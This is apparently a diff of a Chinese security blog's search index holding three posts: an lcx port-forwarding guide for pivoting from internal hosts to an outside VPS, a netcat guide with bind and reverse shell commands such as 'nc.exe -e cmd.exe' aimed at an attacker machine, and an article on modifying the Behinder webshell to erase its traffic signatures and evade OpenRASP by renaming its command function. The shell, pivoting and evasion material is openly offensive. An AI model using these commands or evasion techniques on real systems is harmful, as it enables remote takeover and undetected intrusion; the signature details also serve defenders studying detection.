+    <title>lcx常用命令说明</title>
+    <url>/2021/01/27/lcx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/</url>
+    <content><![CDATA[<h1 id="命令说明："><a href="#命令说明：" class="headerlink" title="命令说明："></a>命令说明：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;监听p1,接收由p2转发过来的数据 </span><br><span class="line"></span><br><span class="line">-tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信 </span><br><span class="line"></span><br><span class="line">-slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt;端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure>
+<h1 id="实战使用："><a href="#实战使用：" class="headerlink" title="实战使用："></a>实战使用：</h1><h3 id="两台机器："><a href="#两台机器：" class="headerlink" title="两台机器："></a>两台机器：</h3><ol>
+<li>将内网机器 3389 端口流量转发到外网 VPS 机器 55 端口上:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 192.168.81.128 55 172.16.1.20 3389</span><br></pre></td></tr></table></figure></li>
+<li>在外网 VPS 机器 55 端口上进行监听，,接收由外网 VPS 机器 3389转发过来的数据 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 55 3389</span><br></pre></td></tr></table></figure></li>
+<li>连接外网 VPS 机器 3389 端口即连接内网机器 3389 端口</li>
+</ol>
+<h3 id="多台机器："><a href="#多台机器：" class="headerlink" title="多台机器："></a>多台机器：</h3><p>多台机器中间的机器可能只有某台机器可以出外网，可进行转发具体命令如下：<br><strong>机器1(不可出外网)-172.16.1.10：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 172.16.1.20 55 172.16.1.10 3389</span><br></pre></td></tr></table></figure>
+<p><strong>机器2(不可出外网)-172.16.1.20：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 55 172.16.1.30 66</span><br></pre></td></tr></table></figure>
+<p><strong>机器3(可出外网)-172.16.1.30：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 66 192.168.81.128 77</span><br></pre></td></tr></table></figure>
+<p><strong>机器4(外网VPS)-192.168.81.128：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 77 3389</span><br></pre></td></tr></table></figure>
+<p>连接机器 4 外网 VPS 机器的 3389 端口即连接内网机器 1 的 3389 端口</p>
+]]></content>
+      <categories>
+        <category>工具教程</category>
+      </categories>
+      <tags>
+        <tag>内网工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>冰蝎，从入门到魔改（续）</title>
+    <url>/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本篇文章是<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f">《冰蝎，从入门到魔改》</a>的续篇。有小伙伴读过上一篇文章后联系笔者，说只介绍了 PHP 版本的特征擦除，希望可以获知其它语言版本的特征擦除思路和方法。本篇首先简单介绍一下上一篇文章中的通用流量特征点及擦除后的效果，再着重介绍在对”冰蝎”JSP 版和 ASP 版的魔改中碰到的问题及流量监测/规避的方法思路。</p>
+<h2 id="0x02-通用篇"><a href="#0x02-通用篇" class="headerlink" title="0x02 通用篇"></a>0x02 通用篇</h2><p>本章节简单的介绍一下 PHP、JSP、ASP 版本”冰蝎”的通用特征，具体原理和修改思路可以参考上一篇文章：<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f">《冰蝎，从入门到魔改》</a></p>
+<h3 id="密钥交换时的URL参数"><a href="#密钥交换时的URL参数" class="headerlink" title="密钥交换时的URL参数"></a>密钥交换时的URL参数</h3><p><strong>特征：</strong></p>
+<p>密钥交换式 Webshell 默认密码为 pass，并且参数值为 3 位随机数字。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image1.png"></p>
+<p><strong>修改版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image2.png"></p>
+<h3 id="header中的Content-Type"><a href="#header中的Content-Type" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p><strong>特征：</strong></p>
+<p>GET 形式访问会携带 Content-type 字段，并且内容固定。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image3.png"></p>
+<p><strong>修改版：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image4.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image5.png"></p>
+<h3 id="header中的User-Agent"><a href="#header中的User-Agent" class="headerlink" title="header中的User-Agent"></a>header中的User-Agent</h3><p><strong>特征：</strong></p>
+<p>内置 17 个较旧 的User-Agent。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image6.png"></p>
+<p><strong>修改版：</strong></p>
+<p>2020 年发布的 Firefox 75.0：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image7.png"></p>
+<p>2019 年 11 月发布的 Chrome 78.0.3904.108：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image8.png"></p>
+<h3 id="header中的Accept"><a href="#header中的Accept" class="headerlink" title="header中的Accept"></a>header中的Accept</h3><p><strong>特征：</strong></p>
+<p>Accept 字段为固定非常见值。</p>
+<p><strong>原版：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image9.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image10.png"></p>
+<p><strong>修改版：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image11.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image12.png"></p>
+<h3 id="二次密钥获取"><a href="#二次密钥获取" class="headerlink" title="二次密钥获取"></a>二次密钥获取</h3><p><strong>特征：</strong></p>
+<p>至少两次的 GET 形式获取密钥的过程。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image13.png"></p>
+<p><strong>修改版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image14.png"></p>
+<h3 id="response中返回密钥"><a href="#response中返回密钥" class="headerlink" title="response中返回密钥"></a>response中返回密钥</h3><p><strong>特征：</strong></p>
+<p>密钥返回是直接以 16 位字符的形式返回到客户端，Content-Length 固定为 16。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image15.png"></p>
+<p><strong>修改版：</strong></p>
+<p>直接访问：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image16.png"></p>
+<p>流量侧：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image17.png"></p>
+<h3 id="header中的Cookie"><a href="#header中的Cookie" class="headerlink" title="header中的Cookie"></a>header中的Cookie</h3><p><strong>特征：</strong></p>
+<p>Cookie 中携带非常规的 Path 参数内容。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image18.png"></p>
+<p><strong>修改后的效果：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image19.png"></p>
+<h2 id="0x03-JSP篇"><a href="#0x03-JSP篇" class="headerlink" title="0x03 JSP篇"></a>0x03 JSP篇</h2><h3 id="Webshell免杀原理"><a href="#Webshell免杀原理" class="headerlink" title="Webshell免杀原理"></a>Webshell免杀原理</h3><p>首先看下 JSP 版的 Webshell 代码，大体逻辑如下：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image20.png"></p>
+<p>可以看到将客户端发来的字节码转为类并实例化，之后调用了 equals 函数。 equals 函数默认为 Object 的函数，是比较两个对象的内存地址，在 JAVA 代码中非常常见的函数，所以整个 Webshell 看起来人畜无害。</p>
+<p>我们看下客户端中的相关代码，首先通过 getData 函数来获取发送的数据：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image21.png"></p>
+<p>getParamedClass 函数为将类转为字节码的关键函数：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image22.png"></p>
+<p>被转成字节码的 Cmd 类，其中 cmd 参数为执行命令的字符串：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image23.png"></p>
+<p>可以看到，Cmd 类中将 equals 函数重写了，内部中调用了 RunCMD 。而 RunCMD 实际就是使用 Runtime.getRuntime().exec 执行系统命令，并将输出返回。</p>
+<h3 id="header中的Content-Type-1"><a href="#header中的Content-Type-1" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p>JSP版本连接的时候，客户端的请求包中的 Content-Type 为 application/octet-stream ，意思是客户端传输的为字节流。如果未有此相关业务，可作为一个较明显的监测特征。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image24.png"></p>
+<p><strong>修改思路：</strong></p>
+<p>POST形式访问时将值改为 Content-Type 值改为 “text/html; charset=utf-8” 或者 “text/x-www-form-urlencoded; charset=utf-8” 以规避安全检测。</p>
+<p>看Webshell中的代码是直接读取了一整行的数据，所以改成其它类型也是没关系的。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image25.png"></p>
+<p><strong>修改后的效果：</strong></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image26.png"></p>
+<h3 id="对抗RASP"><a href="#对抗RASP" class="headerlink" title="对抗RASP"></a>对抗RASP</h3><p><strong>什么是RASP？</strong></p>
+<p>RASP 英文为 Runtime application self-protection，即实时应用自我保护。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序和应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遇到特定漏洞和攻击时不需要人工干预就可以进行自动重新配置应对新的攻击。</p>
+<p>此理念的众多产品，其中比较有名的开源项目叫做 OpenRASP 。 OpenRASP 是可以监测冰蝎后门的，不论 Webshell 如何免杀变形，OpenRASP 基于命令执行的调用堆栈来识别冰蝎：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image27.png"></p>
+<p>hah~ 这里提到了只要客户端代码不变，就可以检测到，但是我们既然是魔改就肯定会改代码的~</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image28.jpg"></p>
+<p>先来看下”冰蝎”连接 Webshell 后运行命令 whoami 的结果，在部署好 OpenRASP 后运行，可以在 tomcatroot/rasp/logs/alarm/alarm.log 文件中查到告警日志：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image29.png"></p>
+<p>我们可以看到，OpenRASP监测到了调用堆栈，冰蝎识别出了命令”cmd.exe /c whoami” 。</p>
+<p><strong>修改思路：</strong></p>
+<p>网上能查到的规避方案是修改包名，将 net.rebeyond.behinder 这三层包名修改或去掉。但是我们要知其然还要知其所以然。</p>
+<p>在更深入的了解 OpenRASP 的检测功能后我们发现，OpenRASP 的检测逻辑部分是由 JavaScript 语言实现的，原因是为了避免多平台上的重新实现。官方对此也有所说明：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image30.png"></p>
+<p>官方的检测逻辑在 <tomcatroot>/rasp/plugins/official.js 中，我们来查看这个文件并找出了检测调用堆栈的部分：</tomcatroot></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image31.png"></p>
+<p>可以看到多种检测堆栈关键字的漏洞，如：fastjson 反序列化、ElasticSearch Groovy 的 RCE 等。在该文件第866行我们找到了”冰蝎”的检测关键字：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.rebeyond.behinder.payload.java.Cmd.RunCMD</span><br></pre></td></tr></table></figure>
+<p>关键字检测精确到了函数名 RunCMD。</p>
+<p>既然如此我们没有必要大张旗鼓地修改包名（还要修改调用资源的路径，非常麻烦），我们只需要修改 RunCMD 函数的名称就可以规避 OpenRASP 的检测。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>我们修改好函数名后重新编译，并将服务器中的 alarm.log 告警日志清空后重启。</p>
+<p>客户端执行 whoami：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image32.png"></p>
+<p>服务端 OpenRASP 无法检测到该条命令执行，告警日志为空：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image33.png"></p>
+<h2 id="0x04-ASP篇"><a href="#0x04-ASP篇" class="headerlink" title="0x04 ASP篇"></a>0x04 ASP篇</h2><h3 id="魔改中的小坑"><a href="#魔改中的小坑" class="headerlink" title="魔改中的小坑"></a>魔改中的小坑</h3><p>在 ASP 版本的 Webshell 有个小坑。</p>
+<p>我们直接使用魔改之后的版本进行连接会报错：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image34.png"></p>
+<p>我们抓包看下：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image35.png"></p>
+<p>服务端返回状态码 500，服务器内部错误。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image36.jpeg"></p>
+<p>其实这个坑点是在密钥交换的 GET 请求中，判断密码参数（默认为 pass 的字段）是否存在。</p>
+<p>代码如下:</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image37.png"></p>
+<p>在原版本中 pass 的值为随机 3 位数字，在 C# 语法中数字可以作为If判断的条件（0 为 False，其它数字为  True）。但是在我们的魔改版本中 pass 的值为了规避监测设置为了随机字符串。 C# 中字符串类型无法作为 If 的判断条件，会报类型不匹配的错误：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image38.png"></p>
+<p>我们需要将 Webshell 稍微改下，判断 pass 的值不为空字符串即可解决此问题。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image39.png"></p>
+<p>运行结果：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image40.png"></p>
+<p>客户端连接：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image41.png"></p>
+<h3 id="header中的Content-Type-2"><a href="#header中的Content-Type-2" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p>ASP 版本的此问题跟 JSP 版本相同，都是在连接的时候，客户端的请求包中的 Content-Type 为 application/octet-stream ，可参考  JSP版本的修改思路。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image42.png"></p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>在笔者编写此篇文章之际，已经听闻到有”冰蝎”即将更新的消息。在这 HW 来临之际进行更新，可以预见到攻防两方都需要对此做好准备。祝各位参与 HW 的读者：HW 顺利 !</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image43.jpeg"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+        <tag>安全工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>netcat常用命令说明</title>
+    <url>/2021/01/27/netcat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/</url>
+    <content><![CDATA[<h1 id="命令说明："><a href="#命令说明：" class="headerlink" title="命令说明："></a>命令说明：</h1><p>监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888</span><br></pre></td></tr></table></figure>
+<p>监听端口并执行cmd</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure>
+<p>直接正向连接 IP + 端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -nvv 192.168.81.140 8888</span><br></pre></td></tr></table></figure>
+<p>将 cmd 转发到 IP + 端口 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd.exe 192.168.81.128 8889</span><br></pre></td></tr></table></figure>
+
+<h1 id="实战使用："><a href="#实战使用：" class="headerlink" title="实战使用："></a>实战使用：</h1><h3 id="正向："><a href="#正向：" class="headerlink" title="正向："></a>正向：</h3><ol>
+<li>受害机器上执行监听 8888 端口并执行 cmd:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure></li>
+<li>攻击机直接连接受害机器 IP + 端口 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -nvv 192.168.81.140 8888</span><br></pre></td></tr></table></figure></li>
+<li>攻击机即可执行shell</li>
+</ol>
+<h3 id="反向："><a href="#反向：" class="headerlink" title="反向："></a>反向：</h3><ol>
+<li>攻击机监听 8888 端口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888</span><br></pre></td></tr></table></figure></li>
+<li>受害机器上将 cmd 转发到攻击机 IP + 端口 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd.exe 192.168.81.128 8889</span><br></pre></td></tr></table></figure></li>
+<li>攻击机即可接收到受害机器的反弹shell</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具教程</category>
+      </categories>
+      <tags>
+        <tag>内网工具</tag>
       </tags>
   </entry>
   <entry>
@@ -691,134 +820,5 @@ for c in ().__class__.__base__.__subclasses__():
       <categories>
         <category>原创文章</category>
       </categories>
-  </entry>
-  <entry>
-    <title>netcat常用命令说明</title>
-    <url>/2021/01/27/netcat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/</url>
-    <content><![CDATA[<h1 id="命令说明："><a href="#命令说明：" class="headerlink" title="命令说明："></a>命令说明：</h1><p>监听端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888</span><br></pre></td></tr></table></figure>
-<p>监听端口并执行cmd</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure>
-<p>直接正向连接 IP + 端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -nvv 192.168.81.140 8888</span><br></pre></td></tr></table></figure>
-<p>将 cmd 转发到 IP + 端口 </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd.exe 192.168.81.128 8889</span><br></pre></td></tr></table></figure>
-
-<h1 id="实战使用："><a href="#实战使用：" class="headerlink" title="实战使用："></a>实战使用：</h1><h3 id="正向："><a href="#正向：" class="headerlink" title="正向："></a>正向：</h3><ol>
-<li>受害机器上执行监听 8888 端口并执行 cmd:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure></li>
-<li>攻击机直接连接受害机器 IP + 端口 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -nvv 192.168.81.140 8888</span><br></pre></td></tr></table></figure></li>
-<li>攻击机即可执行shell</li>
-</ol>
-<h3 id="反向："><a href="#反向：" class="headerlink" title="反向："></a>反向：</h3><ol>
-<li>攻击机监听 8888 端口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888</span><br></pre></td></tr></table></figure></li>
-<li>受害机器上将 cmd 转发到攻击机 IP + 端口 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd.exe 192.168.81.128 8889</span><br></pre></td></tr></table></figure></li>
-<li>攻击机即可接收到受害机器的反弹shell</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具教程</category>
-      </categories>
-      <tags>
-        <tag>内网工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>lcx常用命令说明</title>
-    <url>/2021/01/27/lcx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/</url>
-    <content><![CDATA[<h1 id="命令说明："><a href="#命令说明：" class="headerlink" title="命令说明："></a>命令说明：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;监听p1,接收由p2转发过来的数据 </span><br><span class="line"></span><br><span class="line">-tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信 </span><br><span class="line"></span><br><span class="line">-slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt;端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure>
-<h1 id="实战使用："><a href="#实战使用：" class="headerlink" title="实战使用："></a>实战使用：</h1><h3 id="两台机器："><a href="#两台机器：" class="headerlink" title="两台机器："></a>两台机器：</h3><ol>
-<li>将内网机器 3389 端口流量转发到外网 VPS 机器 55 端口上:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 192.168.81.128 55 172.16.1.20 3389</span><br></pre></td></tr></table></figure></li>
-<li>在外网 VPS 机器 55 端口上进行监听，,接收由外网 VPS 机器 3389转发过来的数据 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 55 3389</span><br></pre></td></tr></table></figure></li>
